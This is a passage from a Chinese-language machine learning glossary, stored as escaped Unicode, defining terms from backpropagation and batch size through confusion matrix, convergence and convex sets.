\u4e0b\u9762\u79ef\u662f\uff0c\u5bf9\u4e8e\u968f\u673a\u9009\u62e9\u7684\u6b63\u7c7b\u522b\u6837\u672c\u786e\u5b9e\u4e3a\u6b63\u7c7b\u522b\uff0c\u4ee5\u53ca\u968f\u673a\u9009\u62e9\u7684\u8d1f\u7c7b\u522b\u6837\u672c\u4e3a\u6b63\u7c7b\u522b\uff0c\u5206\u7c7b\u5668\u66f4\u786e\u4fe1\u524d\u8005\u7684\u6982\u7387\u3002 3. B # 3.1. \u53cd\u5411\u4f20\u64ad\u7b97\u6cd5 (backpropagation) # \u5728 \u795e\u7ecf\u7f51\u7edc \u4e0a\u6267\u884c \u68af\u5ea6\u4e0b\u964d\u6cd5 \u7684\u4e3b\u8981\u7b97\u6cd5\u3002\u8be5\u7b97\u6cd5\u4f1a\u5148\u6309\u524d\u5411\u4f20\u64ad\u65b9\u5f0f\u8ba1\u7b97\uff08\u5e76\u7f13\u5b58\uff09\u6bcf\u4e2a\u8282\u70b9\u7684\u8f93\u51fa\u503c\uff0c\u7136\u540e\u518d\u6309\u53cd\u5411\u4f20\u64ad\u904d\u5386\u56fe\u7684\u65b9\u5f0f\u8ba1\u7b97\u635f\u5931\u51fd\u6570\u503c\u76f8\u5bf9\u4e8e\u6bcf\u4e2a\u53c2\u6570\u7684 \u504f\u5bfc\u6570 \u3002 3.2. \u57fa\u51c6 (baseline) # \u4e00\u79cd\u7b80\u5355\u7684 \u6a21\u578b \u6216\u542f\u53d1\u6cd5\uff0c\u7528\u4f5c\u6bd4\u8f83\u6a21\u578b\u6548\u679c\u65f6\u7684\u53c2\u8003\u70b9\u3002\u57fa\u51c6\u6709\u52a9\u4e8e\u6a21\u578b\u5f00\u53d1\u8005\u9488\u5bf9\u7279\u5b9a\u95ee\u9898\u91cf\u5316\u6700\u4f4e\u9884\u671f\u6548\u679c\u3002 3.3. \u6279\u6b21 (batch) # \u6a21\u578b\u8bad\u7ec3 \u7684\u4e00\u6b21 \u8fed\u4ee3 \uff08\u5373\u4e00\u6b21 \u68af\u5ea6 \u66f4\u65b0\uff09\u4e2d\u4f7f\u7528\u7684\u6837\u672c\u96c6\u3002 \u53e6\u8bf7\u53c2\u9605 \u6279\u6b21\u5927\u5c0f \u3002 3.4. \u6279\u6b21\u5927\u5c0f (batch size) # \u4e00\u4e2a \u6279\u6b21 \u4e2d\u7684\u6837\u672c\u6570\u3002\u4f8b\u5982\uff0c SGD \u7684\u6279\u6b21\u5927\u5c0f\u4e3a 1\uff0c\u800c \u5c0f\u6279\u6b21 \u7684\u5927\u5c0f\u901a\u5e38\u4ecb\u4e8e 10 \u5230 1000 \u4e4b\u95f4\u3002\u6279\u6b21\u5927\u5c0f\u5728\u8bad\u7ec3\u548c\u63a8\u65ad\u671f\u95f4\u901a\u5e38\u662f\u56fa\u5b9a\u7684\uff1b\u4e0d\u8fc7\uff0cTensorFlow \u5141\u8bb8\u4f7f\u7528\u52a8\u6001\u6279\u6b21\u5927\u5c0f\u3002 3.5. \u504f\u5dee (bias) # \u8ddd\u79bb\u539f\u70b9\u7684\u622a\u8ddd\u6216\u504f\u79fb\u3002\u504f\u5dee\uff08\u4e5f\u79f0\u4e3a\u504f\u5dee\u9879\uff09\u5728\u673a\u5668\u5b66\u4e60\u6a21\u578b\u4e2d\u7528 b \u6216 w~0~ \u8868\u793a\u3002\u4f8b\u5982\uff0c\u5728\u4e0b\u9762\u7684\u516c\u5f0f\u4e2d\uff0c\u504f\u5dee\u4e3a b\uff1a y' = b + w_1 x_1 + w_2 x_2 + \\dots + w_n x_n \u8bf7\u52ff\u4e0e \u9884\u6d4b\u504f\u5dee \u6df7\u6dc6\u3002 3.6. \u4e8c\u5143\u5206\u7c7b (binary classification) # \u4e00\u79cd\u5206\u7c7b\u4efb\u52a1\uff0c\u53ef\u8f93\u51fa\u4e24\u79cd\u4e92\u65a5\u7c7b\u522b\u4e4b\u4e00\u3002\u4f8b\u5982\uff0c\u5bf9\u7535\u5b50\u90ae\u4ef6\u8fdb\u884c\u8bc4\u4f30\u5e76\u8f93\u51fa\"\u5783\u573e\u90ae\u4ef6\"\u6216\"\u975e\u5783\u573e\u90ae\u4ef6\"\u7684\u673a\u5668\u5b66\u4e60\u6a21\u578b\u5c31\u662f\u4e00\u4e2a\u4e8c\u5143\u5206\u7c7b\u5668\u3002 3.7. \u5206\u7bb1 (binning) # \u8bf7\u53c2\u9605 \u5206\u6876 \u3002 3.8. \u5206\u6876 (bucketing) # \u5c06\u4e00\u4e2a\u7279\u5f81\uff08\u901a\u5e38\u662f \u8fde\u7eed \u7279\u5f81\uff09\u8f6c\u6362\u6210\u591a\u4e2a\u4e8c\u5143\u7279\u5f81\uff08\u79f0\u4e3a\u6876\u6216\u7bb1\uff09\uff0c\u901a\u5e38\u6839\u636e\u503c\u533a\u95f4\u8fdb\u884c\u8f6c\u6362\u3002\u4f8b\u5982\uff0c\u60a8\u53ef\u4ee5\u5c06\u6e29\u5ea6\u533a\u95f4\u5206\u5272\u4e3a\u79bb\u6563\u5206\u7bb1\uff0c\u800c\u4e0d\u662f\u5c06\u6e29\u5ea6\u8868\u793a\u6210\u5355\u4e2a\u8fde\u7eed\u7684\u6d6e\u70b9\u7279\u5f81\u3002\u5047\u8bbe\u6e29\u5ea6\u6570\u636e\u53ef\u7cbe\u786e\u5230\u5c0f\u6570\u70b9\u540e\u4e00\u4f4d\uff0c\u5219\u53ef\u4ee5\u5c06\u4ecb\u4e8e 0.0 \u5230 15.0 \u5ea6\u4e4b\u95f4\u7684\u6240\u6709\u6e29\u5ea6\u90fd\u5f52\u5165\u4e00\u4e2a\u5206\u7bb1\uff0c\u5c06\u4ecb\u4e8e 15.1 \u5230 30.0 \u5ea6\u4e4b\u95f4\u7684\u6240\u6709\u6e29\u5ea6\u5f52\u5165\u7b2c\u4e8c\u4e2a\u5206\u7bb1\uff0c\u5e76\u5c06\u4ecb\u4e8e 30.1 \u5230 50.0 \u5ea6\u4e4b\u95f4\u7684\u6240\u6709\u6e29\u5ea6\u5f52\u5165\u7b2c\u4e09\u4e2a\u5206\u7bb1\u3002 4. C # 4.1. \u6821\u51c6\u5c42 (calibration layer) # \u4e00\u79cd\u9884\u6d4b\u540e\u8c03\u6574\uff0c\u901a\u5e38\u662f\u4e3a\u4e86\u964d\u4f4e \u9884\u6d4b\u504f\u5dee \u7684\u5f71\u54cd\u3002\u8c03\u6574\u540e\u7684\u9884\u6d4b\u548c\u6982\u7387\u5e94\u4e0e\u89c2\u5bdf\u5230\u7684\u6807\u7b7e\u96c6\u7684\u5206\u5e03\u4e00\u81f4\u3002 4.2. \u5019\u9009\u91c7\u6837 (candidate sampling) # \u4e00\u79cd\u8bad\u7ec3\u65f6\u8fdb\u884c\u7684\u4f18\u5316\uff0c\u4f1a\u4f7f\u7528\u67d0\u79cd\u51fd\u6570\uff08\u4f8b\u5982 softmax\uff09\u9488\u5bf9\u6240\u6709\u6b63\u7c7b\u522b\u6807\u7b7e\u8ba1\u7b97\u6982\u7387\uff0c\u4f46\u5bf9\u4e8e\u8d1f\u7c7b\u522b\u6807\u7b7e\uff0c\u5219\u4ec5\u9488\u5bf9\u5176\u968f\u673a\u6837\u672c\u8ba1\u7b97\u6982\u7387\u3002\u4f8b\u5982\uff0c\u5982\u679c\u67d0\u4e2a\u6837\u672c\u7684\u6807\u7b7e\u4e3a\"\u5c0f\u730e\u72ac\"\u548c\"\u72d7\"\uff0c\u5219\u5019\u9009\u91c7\u6837\u5c06\u9488\u5bf9\"\u5c0f\u730e\u72ac\"\u548c\"\u72d7\"\u7c7b\u522b\u8f93\u51fa\u4ee5\u53ca\u5176\u4ed6\u7c7b\u522b\uff08\u732b\u3001\u68d2\u68d2\u7cd6\u3001\u6805\u680f\uff09\u7684\u968f\u673a\u5b50\u96c6\u8ba1\u7b97\u9884\u6d4b\u6982\u7387\u548c\u76f8\u5e94\u7684\u635f\u5931\u9879\u3002\u8fd9\u79cd\u91c7\u6837\u57fa\u4e8e\u7684\u60f3\u6cd5\u662f\uff0c\u53ea\u8981 \u6b63\u7c7b\u522b \u59cb\u7ec8\u5f97\u5230\u9002\u5f53\u7684\u6b63\u589e\u5f3a\uff0c \u8d1f\u7c7b\u522b \u5c31\u53ef\u4ee5\u4ece\u9891\u7387\u8f83\u4f4e\u7684\u8d1f\u589e\u5f3a\u4e2d\u8fdb\u884c\u5b66\u4e60\uff0c\u8fd9\u786e\u5b9e\u662f\u5728\u5b9e\u9645\u4e2d\u89c2\u5bdf\u5230\u7684\u60c5\u51b5\u3002\u5019\u9009\u91c7\u6837\u7684\u76ee\u7684\u662f\uff0c\u901a\u8fc7\u4e0d\u9488\u5bf9\u6240\u6709\u8d1f\u7c7b\u522b\u8ba1\u7b97\u9884\u6d4b\u7ed3\u679c\u6765\u63d0\u9ad8\u8ba1\u7b97\u6548\u7387\u3002 4.3. \u5206\u7c7b\u6570\u636e (categorical data) # \u4e00\u79cd \u7279\u5f81 \uff0c\u62e5\u6709\u4e00\u7ec4\u79bb\u6563\u7684\u53ef\u80fd\u503c\u3002\u4ee5\u67d0\u4e2a\u540d\u4e3a house style \u7684\u5206\u7c7b\u7279\u5f81\u4e3a\u4f8b\uff0c\u8be5\u7279\u5f81\u62e5\u6709\u4e00\u7ec4\u79bb\u6563\u7684\u53ef\u80fd\u503c\uff08\u5171\u4e09\u4e2a\uff09\uff0c\u5373 Tudor, ranch, colonial \u3002\u901a\u8fc7\u5c06 house style \u8868\u793a\u6210\u5206\u7c7b\u6570\u636e\uff0c\u76f8\u5e94\u6a21\u578b\u53ef\u4ee5\u5b66\u4e60 Tudor \u3001 ranch \u548c colonial \u5206\u522b\u5bf9\u623f\u4ef7\u7684\u5f71\u54cd\u3002 \u6709\u65f6\uff0c\u79bb\u6563\u96c6\u4e2d\u7684\u503c\u662f\u4e92\u65a5\u7684\uff0c\u53ea\u80fd\u5c06\u5176\u4e2d\u4e00\u4e2a\u503c\u5e94\u7528\u4e8e\u6307\u5b9a\u6837\u672c\u3002\u4f8b\u5982\uff0c car maker \u5206\u7c7b\u7279\u5f81\u53ef\u80fd\u53ea\u5141\u8bb8\u4e00\u4e2a\u6837\u672c\u6709\u4e00\u4e2a\u503c ( Toyota )\u3002\u5728\u5176\u4ed6\u60c5\u51b5\u4e0b\uff0c\u5219\u53ef\u4ee5\u5e94\u7528\u591a\u4e2a\u503c\u3002\u4e00\u8f86\u8f66\u53ef\u80fd\u4f1a\u88ab\u55b7\u6d82\u591a\u79cd\u4e0d\u540c\u7684\u989c\u8272\uff0c\u56e0\u6b64\uff0c car color \u5206\u7c7b\u7279\u5f81\u53ef\u80fd\u4f1a\u5141\u8bb8\u5355\u4e2a\u6837\u672c\u5177\u6709\u591a\u4e2a\u503c\uff08\u4f8b\u5982 red \u548c white \uff09\u3002 \u5206\u7c7b\u7279\u5f81\u6709\u65f6\u79f0\u4e3a \u79bb\u6563\u7279\u5f81 \u3002 \u4e0e \u6570\u503c\u6570\u636e \u76f8\u5bf9\u3002 4.4. \u5f62\u5fc3 (centroid) # \u805a\u7c7b\u7684\u4e2d\u5fc3\uff0c\u7531 k-means \u6216 k-median \u7b97\u6cd5\u51b3\u5b9a\u3002\u4f8b\u5982\uff0c\u5982\u679c k \u4e3a 3\uff0c\u5219 k-means \u6216 k-median \u7b97\u6cd5\u4f1a\u627e\u51fa 3 \u4e2a\u5f62\u5fc3\u3002 4.5. \u68c0\u67e5\u70b9 (checkpoint) # \u4e00\u79cd\u6570\u636e\uff0c\u7528\u4e8e\u6355\u83b7\u6a21\u578b\u53d8\u91cf\u5728\u7279\u5b9a\u65f6\u95f4\u7684\u72b6\u6001\u3002\u501f\u52a9\u68c0\u67e5\u70b9\uff0c\u53ef\u4ee5\u5bfc\u51fa\u6a21\u578b \u6743\u91cd \uff0c\u8de8\u591a\u4e2a\u4f1a\u8bdd\u6267\u884c\u8bad\u7ec3\uff0c\u4ee5\u53ca\u4f7f\u8bad\u7ec3\u5728\u53d1\u751f\u9519\u8bef\u4e4b\u540e\u5f97\u4ee5\u7ee7\u7eed\uff08\u4f8b\u5982\u4f5c\u4e1a\u62a2\u5360\uff09\u3002\u8bf7\u6ce8\u610f\uff0c \u56fe \u672c\u8eab\u4e0d\u5305\u542b\u5728\u68c0\u67e5\u70b9\u4e2d\u3002 4.6. \u7c7b\u522b (class) # \u4e3a\u6807\u7b7e\u679a\u4e3e\u7684\u4e00\u7ec4\u76ee\u6807\u503c\u4e2d\u7684\u4e00\u4e2a\u3002\u4f8b\u5982\uff0c\u5728\u68c0\u6d4b\u5783\u573e\u90ae\u4ef6\u7684 \u4e8c\u5143\u5206\u7c7b \u6a21\u578b\u4e2d\uff0c\u4e24\u79cd\u7c7b\u522b\u5206\u522b\u662f\"\u5783\u573e\u90ae\u4ef6\"\u548c\"\u975e\u5783\u573e\u90ae\u4ef6\"\u3002\u5728\u8bc6\u522b\u72d7\u54c1\u79cd\u7684 \u591a\u7c7b\u522b\u5206\u7c7b \u6a21\u578b\u4e2d\uff0c\u7c7b\u522b\u53ef\u4ee5\u662f\"\u8d35\u5bbe\u72ac\"\u3001\"\u5c0f\u730e\u72ac\"\u3001\"\u54c8\u5df4\u72ac\"\u7b49\u7b49\u3002 4.7. \u5206\u7c7b\u4e0d\u5e73\u8861\u7684\u6570\u636e\u96c6 (class-imbalanced data set) # \u4e00\u79cd \u4e8c\u5143\u5206\u7c7b \u95ee\u9898\uff0c\u5728\u6b64\u7c7b\u95ee\u9898\u4e2d\uff0c\u4e24\u79cd\u7c7b\u522b\u7684 \u6807\u7b7e \u5728\u51fa\u73b0\u9891\u7387\u65b9\u9762\u5177\u6709\u5f88\u5927\u7684\u5dee\u8ddd\u3002\u4f8b\u5982\uff0c\u5728\u67d0\u4e2a\u75be\u75c5\u6570\u636e\u96c6\u4e2d\uff0c0.0001 \u7684\u6837\u672c\u5177\u6709\u6b63\u7c7b\u522b\u6807\u7b7e\uff0c0.9999 \u7684\u6837\u672c\u5177\u6709\u8d1f\u7c7b\u522b\u6807\u7b7e\uff0c\u8fd9\u5c31\u5c5e\u4e8e\u5206\u7c7b\u4e0d\u5e73\u8861\u95ee\u9898\uff1b\u4f46\u5728\u67d0\u4e2a\u8db3\u7403\u6bd4\u8d5b\u9884\u6d4b\u5668\u4e2d\uff0c0.51 \u7684\u6837\u672c\u7684\u6807\u7b7e\u4e3a\u5176\u4e2d\u4e00\u4e2a\u7403\u961f\u8d62\uff0c0.49 \u7684\u6837\u672c\u7684\u6807\u7b7e\u4e3a\u53e6\u4e00\u4e2a\u7403\u961f\u8d62\uff0c\u8fd9\u5c31\u4e0d\u5c5e\u4e8e\u5206\u7c7b\u4e0d\u5e73\u8861\u95ee\u9898\u3002 4.8. \u5206\u7c7b\u6a21\u578b (classification model) # \u4e00\u79cd\u673a\u5668\u5b66\u4e60\u6a21\u578b\uff0c\u7528\u4e8e\u533a\u5206\u4e24\u79cd\u6216\u591a\u79cd\u79bb\u6563\u7c7b\u522b\u3002\u4f8b\u5982\uff0c\u67d0\u4e2a\u81ea\u7136\u8bed\u8a00\u5904\u7406\u5206\u7c7b\u6a21\u578b\u53ef\u4ee5\u786e\u5b9a\u8f93\u5165\u7684\u53e5\u5b50\u662f\u6cd5\u8bed\u3001\u897f\u73ed\u7259\u8bed\u8fd8\u662f\u610f\u5927\u5229\u8bed\u3002\u8bf7\u4e0e \u56de\u5f52\u6a21\u578b \u8fdb\u884c\u6bd4\u8f83\u3002 4.9. \u5206\u7c7b\u9608\u503c (classification threshold) # \u4e00\u79cd\u6807\u91cf\u503c\u6761\u4ef6\uff0c\u5e94\u7528\u4e8e\u6a21\u578b\u9884\u6d4b\u7684\u5f97\u5206\uff0c\u65e8\u5728\u5c06 \u6b63\u7c7b\u522b \u4e0e \u8d1f\u7c7b\u522b \u533a\u5206\u5f00\u3002\u5c06 \u903b\u8f91\u56de\u5f52 \u7ed3\u679c\u6620\u5c04\u5230 \u4e8c\u5143\u5206\u7c7b \u65f6\u4f7f\u7528\u3002\u4ee5\u67d0\u4e2a\u903b\u8f91\u56de\u5f52\u6a21\u578b\u4e3a\u4f8b\uff0c\u8be5\u6a21\u578b\u7528\u4e8e\u786e\u5b9a\u6307\u5b9a\u7535\u5b50\u90ae\u4ef6\u662f\u5783\u573e\u90ae\u4ef6\u7684\u6982\u7387\u3002\u5982\u679c\u5206\u7c7b\u9608\u503c\u4e3a 0.9\uff0c\u90a3\u4e48\u903b\u8f91\u56de\u5f52\u503c\u9ad8\u4e8e 0.9 \u7684\u7535\u5b50\u90ae\u4ef6\u5c06\u88ab\u5f52\u7c7b\u4e3a\"\u5783\u573e\u90ae\u4ef6\"\uff0c\u4f4e\u4e8e 0.9 \u7684\u5219\u88ab\u5f52\u7c7b\u4e3a\"\u975e\u5783\u573e\u90ae\u4ef6\"\u3002 4.10. \u805a\u7c7b (clustering) # \u5c06\u5173\u8054\u7684 \u6837\u672c \u5206\u6210\u4e00\u7ec4\uff0c\u4e00\u822c\u7528\u4e8e \u975e\u76d1\u7763\u5f0f\u5b66\u4e60 \u3002\u5728\u6240\u6709\u6837\u672c\u5747\u5206\u7ec4\u5b8c\u6bd5\u540e\uff0c\u76f8\u5173\u4eba\u5458\u4fbf\u53ef\u9009\u62e9\u6027\u5730\u4e3a\u6bcf\u4e2a\u805a\u7c7b\u8d4b\u4e88\u542b\u4e49\u3002 \u805a\u7c7b\u7b97\u6cd5\u6709\u5f88\u591a\u3002\u4f8b\u5982\uff0c k-means \u7b97\u6cd5\u4f1a\u57fa\u4e8e\u6837\u672c\u4e0e \u5f62\u5fc3 \u7684\u63a5\u8fd1\u7a0b\u5ea6\u805a\u7c7b\u6837\u672c\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a \u4e4b\u540e\uff0c\u7814\u7a76\u4eba\u5458\u4fbf\u53ef\u67e5\u770b\u8fd9\u4e9b\u805a\u7c7b\u5e76\u8fdb\u884c\u5176\u4ed6\u64cd\u4f5c\uff0c\u4f8b\u5982\uff0c\u5c06\u805a\u7c7b 1 \u6807\u8bb0\u4e3a\"\u77ee\u578b\u6811\"\uff0c\u5c06\u805a\u7c7b 2 \u6807\u8bb0\u4e3a\"\u5168\u5c3a\u5bf8\u6811\"\u3002 \u518d\u4e3e\u4e00\u4e2a\u4f8b\u5b50\uff0c\u4f8b\u5982\u57fa\u4e8e\u6837\u672c\u4e0e\u4e2d\u5fc3\u70b9\u8ddd\u79bb\u7684\u805a\u7c7b\u7b97\u6cd5\uff0c\u5982\u4e0b\u6240\u793a\uff1a 4.11. \u534f\u540c\u8fc7\u6ee4 (collaborative filtering) # \u6839\u636e\u5f88\u591a\u5176\u4ed6\u7528\u6237\u7684\u5174\u8da3\u6765\u9884\u6d4b\u67d0\u4f4d\u7528\u6237\u7684\u5174\u8da3\u3002\u534f\u540c\u8fc7\u6ee4\u901a\u5e38\u7528\u5728\u63a8\u8350\u7cfb\u7edf\u4e2d\u3002 4.12. \u6df7\u6dc6\u77e9\u9635 (confusion matrix) # \u4e00\u79cd NxN \u8868\u683c\uff0c\u7528\u4e8e\u603b\u7ed3 \u5206\u7c7b\u6a21\u578b \u7684\u9884\u6d4b\u6548\u679c\uff1b\u5373\u6807\u7b7e\u548c\u6a21\u578b\u9884\u6d4b\u7684\u5206\u7c7b\u4e4b\u95f4\u7684\u5173\u8054\u3002\u5728\u6df7\u6dc6\u77e9\u9635\u4e2d\uff0c\u4e00\u4e2a\u8f74\u8868\u793a\u6a21\u578b\u9884\u6d4b\u7684\u6807\u7b7e\uff0c\u53e6\u4e00\u4e2a\u8f74\u8868\u793a\u5b9e\u9645\u6807\u7b7e\u3002N \u8868\u793a\u7c7b\u522b\u4e2a\u6570\u3002\u5728 \u4e8c\u5143\u5206\u7c7b \u95ee\u9898\u4e2d\uff0cN=2\u3002\u4f8b\u5982\uff0c\u4e0b\u9762\u663e\u793a\u4e86\u4e00\u4e2a\u4e8c\u5143\u5206\u7c7b\u95ee\u9898\u7684\u6df7\u6dc6\u77e9\u9635\u793a\u4f8b\uff1a \u80bf\u7624\uff08\u9884\u6d4b\u7684\u6807\u7b7e\uff09 \u975e\u80bf\u7624\uff08\u9884\u6d4b\u7684\u6807\u7b7e\uff09 \u80bf\u7624\uff08\u5b9e\u9645\u6807\u7b7e\uff09 18 1 \u975e\u80bf\u7624\uff08\u5b9e\u9645\u6807\u7b7e\uff09 6 452 \u4e0a\u9762\u7684\u6df7\u6dc6\u77e9\u9635\u663e\u793a\uff0c\u5728 19 \u4e2a\u5b9e\u9645\u6709\u80bf\u7624\u7684\u6837\u672c\u4e2d\uff0c\u8be5\u6a21\u578b\u6b63\u786e\u5730\u5c06 18 \u4e2a\u5f52\u7c7b\u4e3a\u6709\u80bf\u7624\uff0818 \u4e2a\u6b63\u4f8b\uff09\uff0c\u9519\u8bef\u5730\u5c06 1 \u4e2a\u5f52\u7c7b\u4e3a\u6ca1\u6709\u80bf\u7624\uff081 \u4e2a\u5047\u8d1f\u4f8b\uff09\u3002\u540c\u6837\uff0c\u5728 458 \u4e2a\u5b9e\u9645\u6ca1\u6709\u80bf\u7624\u7684\u6837\u672c\u4e2d\uff0c\u6a21\u578b\u5f52\u7c7b\u6b63\u786e\u7684\u6709 452 \u4e2a\uff08452 \u4e2a\u8d1f\u4f8b\uff09\uff0c\u5f52\u7c7b\u9519\u8bef\u7684\u6709 6 \u4e2a\uff086 \u4e2a\u5047\u6b63\u4f8b\uff09\u3002 \u591a\u7c7b\u522b\u5206\u7c7b\u95ee\u9898\u7684\u6df7\u6dc6\u77e9\u9635\u6709\u52a9\u4e8e\u786e\u5b9a\u51fa\u9519\u6a21\u5f0f\u3002\u4f8b\u5982\uff0c\u67d0\u4e2a\u6df7\u6dc6\u77e9\u9635\u53ef\u4ee5\u63ed\u793a\uff0c\u67d0\u4e2a\u7ecf\u8fc7\u8bad\u7ec3\u4ee5\u8bc6\u522b\u624b\u5199\u6570\u5b57\u7684\u6a21\u578b\u5f80\u5f80\u4f1a\u5c06 4 \u9519\u8bef\u5730\u9884\u6d4b\u4e3a 9\uff0c\u5c06 7 \u9519\u8bef\u5730\u9884\u6d4b\u4e3a 1\u3002 \u6df7\u6dc6\u77e9\u9635\u5305\u542b\u8ba1\u7b97\u5404\u79cd\u6548\u679c\u6307\u6807\uff08\u5305\u62ec \u7cbe\u786e\u7387 \u548c \u53ec\u56de\u7387 \uff09\u6240\u9700\u7684\u5145\u8db3\u4fe1\u606f\u3002 4.13. \u8fde\u7eed\u7279\u5f81 (continuous feature) # \u4e00\u79cd\u6d6e\u70b9\u7279\u5f81\uff0c\u53ef\u80fd\u503c\u7684\u533a\u95f4\u4e0d\u53d7\u9650\u5236\u3002\u4e0e \u79bb\u6563\u7279\u5f81 \u76f8\u5bf9\u3002 4.14. \u6536\u655b (convergence) # \u901a\u4fd7\u6765\u8bf4\uff0c\u6536\u655b\u901a\u5e38\u662f\u6307\u5728\u8bad\u7ec3\u671f\u95f4\u8fbe\u5230\u7684\u4e00\u79cd\u72b6\u6001\uff0c\u5373\u7ecf\u8fc7\u4e00\u5b9a\u6b21\u6570\u7684\u8fed\u4ee3\u4e4b\u540e\uff0c\u8bad\u7ec3 \u635f\u5931 \u548c\u9a8c\u8bc1\u635f\u5931\u5728\u6bcf\u6b21\u8fed\u4ee3\u4e2d\u7684\u53d8\u5316\u90fd\u975e\u5e38\u5c0f\u6216\u6839\u672c\u6ca1\u6709\u53d8\u5316\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5982\u679c\u91c7\u7528\u5f53\u524d\u6570\u636e\u8fdb\u884c\u989d\u5916\u7684\u8bad\u7ec3\u5c06\u65e0\u6cd5\u6539\u8fdb\u6a21\u578b\uff0c\u6a21\u578b\u5373\u8fbe\u5230\u6536\u655b\u72b6\u6001\u3002\u5728\u6df1\u5ea6\u5b66\u4e60\u4e2d\uff0c\u635f\u5931\u503c\u6709\u65f6\u4f1a\u5728\u6700\u7ec8\u4e0b\u964d\u4e4b\u524d\u7684\u591a\u6b21\u8fed\u4ee3\u4e2d\u4fdd\u6301\u4e0d\u53d8\u6216\u51e0\u4e4e\u4fdd\u6301\u4e0d\u53d8\uff0c\u6682\u65f6\u5f62\u6210\u6536\u655b\u7684\u5047\u8c61\u3002 \u53e6\u8bf7\u53c2\u9605 \u65e9\u505c\u6cd5 \u3002 \u53e6\u8bf7\u53c2\u9605 Boyd \u548c Vandenberghe \u5408\u8457\u7684 Convex Optimization \uff08\u300a\u51f8\u4f18\u5316\u300b\uff09\u3002 4.15. \u51f8\u51fd\u6570 (convex function) # \u4e00\u79cd\u51fd\u6570\uff0c\u51fd\u6570\u56fe\u50cf\u4ee5\u4e0a\u7684\u533a\u57df\u4e3a \u51f8\u96c6 \u3002\u5178\u578b\u51f8\u51fd\u6570\u7684\u5f62\u72b6\u7c7b\u4f3c\u4e8e\u5b57\u6bcd U\u3002\u4f8b\u5982\uff0c\u4ee5\u4e0b\u90fd\u662f\u51f8\u51fd\u6570\uff1a \u76f8\u53cd\uff0c\u4ee5\u4e0b\u51fd\u6570\u5219\u4e0d\u662f\u51f8\u51fd\u6570\u3002\u8bf7\u6ce8\u610f\u56fe\u50cf\u4e0a\u65b9\u7684\u533a\u57df\u5982\u4f55\u4e0d\u662f\u51f8\u96c6\uff1a \u4e25\u683c\u51f8\u51fd\u6570\u53ea\u6709\u4e00\u4e2a\u5c40\u90e8\u6700\u4f4e\u70b9\uff0c\u8be5\u70b9\u4e5f\u662f\u5168\u5c40\u6700\u4f4e\u70b9\u3002\u7ecf\u5178\u7684 U \u5f62\u51fd\u6570\u90fd\u662f\u4e25\u683c\u51f8\u51fd\u6570\u3002\u4e0d\u8fc7\uff0c\u6709\u4e9b\u51f8\u51fd\u6570\uff08\u4f8b\u5982\u76f4\u7ebf\uff09\u5219\u4e0d\u662f\u8fd9\u6837\u3002 \u5f88\u591a\u5e38\u89c1\u7684 \u635f\u5931\u51fd\u6570 \uff08\u5305\u62ec\u4e0b\u5217\u51fd\u6570\uff09\u90fd\u662f\u51f8\u51fd\u6570\uff1a L_2 \u635f\u5931\u51fd\u6570 \u5bf9\u6570\u635f\u5931\u51fd\u6570 L_1 \u6b63\u5219\u5316 L_2 \u6b63\u5219\u5316 \u68af\u5ea6\u4e0b\u964d\u6cd5 \u7684\u5f88\u591a\u53d8\u4f53\u90fd\u4e00\u5b9a\u80fd\u627e\u5230\u4e00\u4e2a\u63a5\u8fd1\u4e25\u683c\u51f8\u51fd\u6570\u6700\u5c0f\u503c\u7684\u70b9\u3002\u540c\u6837\uff0c \u968f\u673a\u68af\u5ea6\u4e0b\u964d\u6cd5 \u7684\u5f88\u591a\u53d8\u4f53\u90fd\u6709\u5f88\u9ad8\u7684\u53ef\u80fd\u6027\u80fd\u591f\u627e\u5230\u63a5\u8fd1\u4e25\u683c\u51f8\u51fd\u6570\u6700\u5c0f\u503c\u7684\u70b9\uff08\u4f46\u5e76\u975e\u4e00\u5b9a\u80fd\u627e\u5230\uff09\u3002 \u4e24\u4e2a\u51f8\u51fd\u6570\u7684\u548c\uff08\u4f8b\u5982 L_2 \u635f\u5931\u51fd\u6570 + L_1 \u6b63\u5219\u5316\uff09\u4e5f\u662f\u51f8\u51fd\u6570\u3002 \u6df1\u5ea6\u6a21\u578b \u7edd\u4e0d\u4f1a\u662f\u51f8\u51fd\u6570\u3002\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u4e13\u95e8\u9488\u5bf9 \u51f8\u4f18\u5316 \u8bbe\u8ba1\u7684\u7b97\u6cd5\u5f80\u5f80\u603b\u80fd\u5728\u6df1\u5ea6\u7f51\u7edc\u4e0a\u627e\u5230\u975e\u5e38\u597d\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u867d\u7136\u8fd9\u4e9b\u89e3\u51b3\u65b9\u6848\u5e76\u4e0d\u4e00\u5b9a\u5bf9\u5e94\u4e8e\u5168\u5c40\u6700\u5c0f\u503c\u3002 4.16. \u51f8\u4f18\u5316 (convex optimization) # \u4f7f\u7528\u6570\u5b66\u65b9\u6cd5\uff08\u4f8b\u5982 \u68af\u5ea6\u4e0b\u964d\u6cd5 \uff09\u5bfb\u627e \u51f8\u51fd\u6570 \u6700\u5c0f\u503c\u7684\u8fc7\u7a0b\u3002\u673a\u5668\u5b66\u4e60\u65b9\u9762\u7684\u5927\u91cf\u7814\u7a76\u90fd\u662f\u4e13\u6ce8\u4e8e\u5982\u4f55\u901a\u8fc7\u516c\u5f0f\u5c06\u5404\u79cd\u95ee\u9898\u8868\u793a\u6210\u51f8\u4f18\u5316\u95ee\u9898\uff0c\u4ee5\u53ca\u5982\u4f55\u66f4\u9ad8\u6548\u5730\u89e3\u51b3\u8fd9\u4e9b\u95ee\u9898\u3002 \u5982\u9700\u5b8c\u6574\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 Boyd \u548c Vandenberghe \u5408\u8457\u7684 Convex Optimization \uff08\u300a\u51f8\u4f18\u5316\u300b\uff09\u3002 4.17. \u51f8\u96c6 (convex set) # \u6b27\u51e0\u91cc\u5f97\u7a7a\u95f4\u7684\u4e00\u4e2a\u5b50\u96c6\uff0c\u5176\u4e2d\u4efb\u610f\u4e24\u70b9\u4e4b\u95f4\u7684\u8fde\u7ebf\u4ecd\u5b8c\u5168\u843d\u5728\u8be5\u5b50\u96c6\u5185\u3002\u4f8b\u5982\uff0c\u4e0b\u9762\u7684\u4e24\u4e2a\u56fe\u5f62\u90fd\u662f\u51f8\u96c6\uff1a 